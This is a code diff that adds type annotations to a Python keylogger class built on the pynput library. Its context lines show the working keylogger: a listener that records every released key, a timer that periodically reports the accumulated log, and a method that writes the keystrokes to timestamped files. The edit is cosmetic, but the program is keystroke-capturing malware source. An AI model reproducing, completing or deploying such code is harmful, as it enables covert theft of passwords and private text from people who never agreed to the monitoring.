@@ -3,14 +3,14 @@ from threading import Timer
 from pynput.keyboard import Listener, Key
 
 class Keylogger:
-    def __init__(self, interval=60, reportMethod="file"):
+    def __init__(self, interval : int = 60, reportMethod : str = "file"):
         self.interval = interval
         self.reportMethod = reportMethod
         self.log = ""                           # Contains the log of all the keystrokes within `self.interval`
         self.startDatetime = datetime.now()
         self.endDatetime = datetime.now()
 
-    def callback(self, key):
+    def callback(self, key : Key) -> None:
         """
             This callback is invoked whenever a keyboard event is occured
         """
@@ -25,7 +25,7 @@ class Keylogger:
         else:
             self.log += str(key).replace("'","")
 
-    def report(self):
+    def report(self) -> None:
         """
             This function gets called every `self.interval`
             It basically sends keylogs and resets `self.log` variable
@@ -45,7 +45,7 @@ class Keylogger:
         timer.daemon = True
         timer.start()
 
-    def reportToFile(self):
+    def reportToFile(self) -> None:
         """
             This method creates a log file in the current directory that contains
             the current keylogs in the `self.log` variable
@@ -54,7 +54,7 @@ class Keylogger:
             print(self.log, file=f)
         print(f"[+] Saved {self.fileName}.txt")
 
-    def start(self):
+    def start(self) -> None:
         self.startDatetime = datetime.now()
         # Start the keylogger
         # Start reporting the keylogs
@@ -64,7 +64,7 @@ class Keylogger:
         with Listener(on_release=self.callback) as listener:
             listener.join()
 
-    def updateFilename(self):
+    def updateFilename(self) -> None:
         """
             Construct the filename to be identified by start & end datetimes
         """
